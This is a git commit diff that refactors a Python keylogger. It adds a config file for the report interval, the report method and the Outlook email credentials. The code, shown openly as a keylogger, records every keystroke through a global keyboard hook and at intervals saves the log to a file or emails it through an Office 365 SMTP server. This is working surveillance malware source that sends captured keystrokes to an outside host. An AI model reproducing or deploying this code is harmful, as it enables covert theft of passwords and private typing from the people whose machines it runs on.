5017f6ea649cfcb65744e6ebc2639eacaa4cf94e
Vitor <vitordonnangeloc@gmail.com>
2023-03-23 15:10:30 -0300

    Improving code readability and adding a configuration file

--- keylogger/main.py
+++ keylogger/main.py
@@ -1,55 +1,85 @@
+'''
+This is a keylogger program written in Python that captures keystrokes and saves them either to a file or sends them via email
+at regular intervals. The user can choose the reporting method and the time between reports. The program uses the 'keyboard' module
+for keystroke capturing and the 'smtplib' module for sending emails. The program also handles special characters such as space, enter,
+and decimal. The email reporting method requires the user to provide their email and password for authentication. The program can
+be started by running the Python script and following the prompts.
+ 
+'''
 import keyboard
 import smtplib
+import pathlib
 from threading import Timer
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-
-valid = 0
-
-reportTimer = int(input("time between reports (in seconds) > "))
-
-while valid == 0:
-    repMethod = input("email or file? > ")
-    if repMethod == 'email' or repMethod == 'file':
-        valid += 1
-    else:
-        print('Wrong answer, please type correctly')
+from configparser import ConfigParser
 
 
+config_path = pathlib.Path(__file__).parent.absolute() / "config.ini"
+
+config = ConfigParser()
+config.read(config_path)
+
+# Set how longer will be the inteval between the report logs are written from config.ini
+reportTimer = int(config['KEYLOGGER']['time'])
+
+# Set the report method from config.ini
+repMethod = config['KEYLOGGER']['method']
+
+
+# The Keylogger class contains methods for capturing keystrokes, updating the filename, reporting to a file, preparing an email
+# message, sending an email, and reporting the keystrokes based on the chosen method.
 class Keylogger:
+    
     def __init__(self, interval, method):
+        
         self.interval = interval
         self.method = method
         self.log = ""
         self.startDt = datetime.now()
         self.endDt = datetime.now()
 
+
     def callback(self, event):
+        
         name = event.name
+        
         if len(name) > 1:
+            
             if name == "space":
                 name = " "
+            
             elif name == "enter":
                 name = "[ENTER]\n"
+            
             elif name == "decimal":
                 name == "."
+            
             else:
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
+        
         self.log += name
 
+
     def updateFilename(self):
+        
         startDtStr = str(self.startDt)[:-7].replace(" ", "-").replace(":", "")
         endDtStr = str(self.endDt)[:-7].replace(" ", "-").replace(":", "")
         self.filename = f"keylog-{startDtStr}_{endDtStr}"
 
+
     def reportToFile(self):
+        
         with open(f"{self.filename}.txt", "w") as f:
             print(self.log, file=f)
+        
         print(f"[+] Saved {self.filename}.txt")
 
+
     def prepEmail(self, message):
+        
         msg = MIMEMultipart("alternative")
         msg["From"] = email
         msg["To"] = email
@@ -57,16 +87,15 @@ class Keylogger:
         html = f"<p>{message}</p>"
         text_part = MIMEText(message, "plain")
         html_part = MIMEText(html, "html")
+        
         msg.attach(text_part)
         msg.attach(html_part)
+        
         return msg.as_string()
 
+
     def sendMail(self, mail, password, message, verbose=1):
-        '''context = ssl.create_default_context()
-        with smtplib.SMTP("smtp.office365.com", 587) as server:
-            server.ehlo()
-            server.helo()
-            server.starttls()'''
+        
         server = smtplib.SMTP(host="smtp.office365.com", port=587)
         server.starttls()
         server.login(mail, password)
@@ -76,13 +105,16 @@ class Keylogger:
         if verbose:
             print(f"{datetime.now()} - Sent as email to {email} containing {message}")
 
+
     def report(self):
+        
         if self.log:
             self.endDt = datetime.now()
             self.updateFilename()
 
             if self.method == "email":
                 self.sendMail(email, passwd, self.log)
+            
             elif self.method == "file":
                 self.reportToFile()
 
@@ -94,21 +126,29 @@ class Keylogger:
         timer = Timer(interval=self.interval, function=self.report)
         timer.daemon = True
         timer.start()
-
+    
+        
+# starts the keylogging process by registering a callback function for keyboard.on_release() and then starting a timer for the 
+# report method, which is responsible for reporting the keystrokes at the specified interval.
     def start(self):
+        
         self.startDt = datetime.now()
         keyboard.on_release(callback=self.callback)
+        
         self.report()
+        
         print(f"{datetime.now()} - Started keylogging")
         keyboard.wait()
 
 
 if __name__ == "__main__":
+    
     if repMethod == 'email':
-        email = input("Your email (Outlook): ")
-        passwd = input("Your password (Outlook): ")
+        email = config['EMAIL']['login']
+        passwd = config['EMAIL']['password']
         keylogger = Keylogger(interval=reportTimer, method='email')
         keylogger.start()
+    
     elif repMethod == 'file':
         keylogger = Keylogger(interval=reportTimer, method='file')
         keylogger.start()
